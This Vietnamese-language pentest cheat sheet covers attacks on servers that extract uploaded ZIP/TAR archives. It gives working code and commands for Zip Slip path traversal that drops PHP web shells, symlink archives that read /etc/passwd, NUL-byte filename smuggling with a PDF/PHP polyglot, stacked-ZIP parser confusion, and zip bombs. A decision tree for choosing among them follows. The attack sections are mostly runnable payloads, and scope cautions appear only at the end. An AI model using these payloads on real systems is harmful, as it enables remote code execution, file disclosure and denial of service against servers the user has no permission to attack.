# File Upload — Archive Attacks (ZIP/TAR)

## Bản chất

Khi ứng dụng cho phép upload file archive (ZIP, TAR, RAR...) và tự động giải nén trên server, attacker có thể khai thác cơ chế archive để thực hiện path traversal, đọc file nhạy cảm qua symlink, hoặc ghi file tùy ý vào vị trí nguy hiểm. Đây là lớp tấn công đặc biệt vì payload nằm **bên trong cấu trúc archive**, không phải trong nội dung file upload thông thường.

## Zip Slip — Path Traversal qua Archive

### Cơ chế

ZIP/TAR format cho phép lưu **đường dẫn đầy đủ** cho mỗi entry. Nếu server giải nén mà không kiểm tra đường dẫn, file entry chứa `../` sẽ được ghi ra ngoài thư mục giải nén.

### Tạo malicious ZIP (Python)

```python
import zipfile
from io import BytesIO

def create_zip():
    f = BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    # Entry path chứa traversal → ghi file vào web root
    z.writestr('../../../../../var/www/html/webserver/shell.php',
               '<?php echo system($_REQUEST["cmd"]); ?>')
    # Entry hợp lệ để archive trông bình thường
    z.writestr('readme.txt', 'Legitimate content')
    z.close()

    with open('malicious.zip', 'wb') as out:
        out.write(f.getvalue())

create_zip()
```

### Tạo malicious ZIP (evilarc tool)

```bash
# Xem options
python2 evilarc.py -h

# Tạo archive cho Linux target, traversal 5 levels, destination /var/www/html/
python2 evilarc.py -o unix -d 5 -p /var/www/html/ shell.php

# Tạo archive cho Windows target
python2 evilarc.py -o win -d 5 -p C:\\inetpub\\wwwroot\\ shell.asp
```

### File Spraying — Upload nhiều file cùng lúc

Tạo nhiều file với tên chứa traversal, rồi zip lại:

```bash
# Tạo PHP backdoor
cat > cmd.php << 'EOF'
<?php
if(isset($_REQUEST['cmd'])){
    system($_REQUEST['cmd']);
}
?>
EOF

# Tạo nhiều bản copy với prefix chứa traversal
for i in $(seq 1 10); do
    FILE="${FILE}xxA"
    cp cmd.php "${FILE}cmd.php"
done

# Zip tất cả
zip spray.zip xx*.php

# Dùng hex editor sửa "xxA" thành "../" trong ZIP
vi spray.zip
# :%s/xxA/../g
# :x!
```

## Symlink Attack qua Archive

### Cơ chế

Archive có thể chứa **symbolic link** (soft link). Khi server giải nén, symlink trỏ đến file/directory bên ngoài → attacker đọc được file nhạy cảm.

### Tạo archive chứa symlink

```bash
# Tạo symlink trỏ đến file target
ln -s ../../../etc/passwd symlink.txt

# ZIP phải giữ symlink (không follow)
zip --symlinks malicious.zip symlink.txt

# TAR
tar -cvf malicious.tar symlink.txt
```

### Luồng khai thác

```
1. Upload ZIP/TAR chứa symlink → symlink trỏ đến /etc/passwd
2. Server giải nén → tạo symlink trên filesystem
3. Access symlink qua web → đọc /etc/passwd
```

### Kết hợp evilarc + symlink

```bash
# Tạo symlink đến target
ln -s /flag.txt flag_link.txt

# Dùng evilarc để đóng gói
python2 evilarc.py flag_link.txt
```

## ZIP NUL-byte Filename Smuggling

### Cơ chế

Lợi dụng sự khác biệt giữa cách PHP `ZipArchive` đọc filename (C-string, cắt tại NUL byte) và cách filesystem ghi file (ghi tên đầy đủ, bỏ phần sau NUL).

### Luồng khai thác

```
1. Tạo file polyglot PDF chứa PHP stub (magic bytes PDF hợp lệ)
2. Đặt tên: shell.php..pdf
3. Zip file
4. Hex-edit ZIP: thay dấu "." đầu tiên sau ".php" bằng 0x00
   → Tên trong ZIP: shell.php\x00.pdf
5. Upload:
   - Validator (ZipArchive) thấy: "shell.php" + truncated → ".pdf" suffix → allowed
   - Extractor ghi: shell.php (cắt tại NUL) → RCE
```

### Thực hiện

```bash
# 1. Tạo polyglot PDF chứa PHP
printf '%%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%%%EOF' > embedded.pdf

# 2. Đặt tên trick (2 dots sau .php)
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3. Hex-edit: Thay dot sau ".php" bằng 0x00
#    Sửa CẢ local header VÀ central directory filename fields
# Tools: hexcurse, bless, bvi, wxHexEditor

# 4. Verify
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# → Hiển thị tên truncated (looks like .pdf)
```

### Lưu ý quan trọng

- Phải sửa **cả hai** vị trí filename trong ZIP (local header và central directory)
- File payload phải vượt qua magic/MIME check — embedding PHP trong PDF stream giữ header hợp lệ
- Hoạt động khi validation path và extraction path xử lý string khác nhau

## Stacked/Concatenated ZIPs

### Cơ chế

Nối hai ZIP hợp lệ tạo thành một blob. Các parser khác nhau focus vào EOCD (End Of Central Directory) record khác nhau:

- Nhiều tool tìm **EOCD cuối cùng** (unzip, 7z)
- Một số library tìm **archive đầu tiên** (ZipArchive trong một số workflow)

### Khai thác

```bash
# Tạo 2 archive riêng biệt
echo "benign content" > safe.txt
zip safe.zip safe.txt

echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip evil.zip shell.php

# Nối lại
cat safe.zip evil.zip > combined.zip
```

Nếu server:

- **Validate** bằng parser đọc archive đầu (safe.zip) → thấy safe.txt → cho phép
- **Extract** bằng tool đọc archive cuối (evil.zip) → giải nén shell.php → RCE

### Kiểm tra parser behavior

```bash
# unzip thường đọc EOCD cuối
unzip -l combined.zip

# PHP ZipArchive
php -r '$z=new ZipArchive; $z->open("combined.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```

## Decompress Bomb (DoS)

### Zip Bomb

File ZIP rất nhỏ (vài KB) nhưng khi giải nén tạo ra file cực lớn (GB/TB) → tràn ổ đĩa, crash server.

### Nested Zip Bomb

ZIP chứa ZIP chứa ZIP... mỗi layer khi giải nén tạo ra nhiều file hơn → exponential growth.

## Decision Tree: Archive Attack

```
Server chấp nhận upload archive (ZIP/TAR)?
│
├── Server tự động giải nén?
│   │
│   ├── CÓ
│   │   ├── Thử Zip Slip (path traversal trong entry name)
│   │   ├── Thử Symlink attack (symlink trỏ đến sensitive file)
│   │   ├── Thử NUL-byte filename smuggling
│   │   ├── Thử Stacked ZIPs (parser disagreement)
│   │   └── Thử DoS (zip bomb, nested bomb)
│   │
│   └── KHÔNG (chỉ lưu archive)
│       ├── Archive có được serve trực tiếp? → Download và phân tích
│       └── Kiểm tra endpoint khác có extract uploaded archives không
│
└── Server không chấp nhận archive?
    ├── Thử upload archive với extension hợp lệ (.jpg.zip → .jpg)
    └── Bypass extension check rồi upload archive
```

## Lưu ý bảo mật khi pentest

- **Không dùng zip bomb** trên production system — có thể gây DoS thực sự
- Zip Slip ghi file → có thể ghi đè file quan trọng → cần cẩn trọng
- Symlink attack đọc file → tương đối an toàn cho pentest
- Luôn xác nhận scope và permission trước khi thực hiện
